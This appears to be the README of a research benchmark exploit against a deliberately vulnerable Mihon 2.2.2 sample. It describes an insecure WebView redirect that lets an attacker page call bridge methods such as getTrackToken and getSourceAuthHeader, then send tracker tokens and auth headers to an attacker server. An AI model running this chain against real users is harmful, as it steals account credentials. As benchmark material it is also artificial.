# EXP: Mihon 2.2.2 Insecure Redirect Handling

This EXP follows the template layout:

- `server.py` starts an attacker HTTP server and prints the final deeplink.
- `exp/2.2.2.html` is the attacker page loaded after the official redirect.
- `received/` stores exfiltrated bridge data.

## Prerequisites

Run the sample's official Python redirect server separately:

```powershell
cd D:\WorkSpace\PhD\zeroth grade\WebViewGPT\WebViewBench\applist\apps\mihon-0.19.9\server\2.2.2_Insecure_Redirect_Handling
python .\server.py
```

Map `mihon.app` to the host running that official server in the Android test environment.

## Run

```powershell
cd D:\WorkSpace\PhD\zeroth grade\WebViewGPT\WebViewBench\applist\exp\mihon-0.19.9\2.2.2_Insecure_Redirect_Handling
python .\server.py --public-host <attacker_host_reachable_from_device>
```

The script prints an `adb shell am start ...` command. Run it against the device or emulator with the vulnerable sample installed.

Default official redirect endpoint:

```text
http://mihon.app:8080/help/jump
```

If your official sample server is exposed at a different origin, pass it explicitly:

```powershell
python .\server.py --public-host <attacker_host> --official-jump "http://mihon.app:8080/help/jump"
```

## Expected Result

After Mihon opens the initial `mihon.app` jump URL, the official server returns a 302 to the attacker page. Because the WebView keeps the initial trusted reader assist state after redirect, the attacker page can call:

- `window.mihonAndroidBridge.getTrackToken("anilist")`
- `window.mihonAndroidBridge.getTrackAuthHeader("myanimelist")`
- `window.mihonAndroidBridge.getSourceAuthHeader()`

Collected data is written to:

```text
received/collected_<timestamp>.json
```

## Notes

The EXP is not part of any git branch and does not modify the vulnerable sample source.
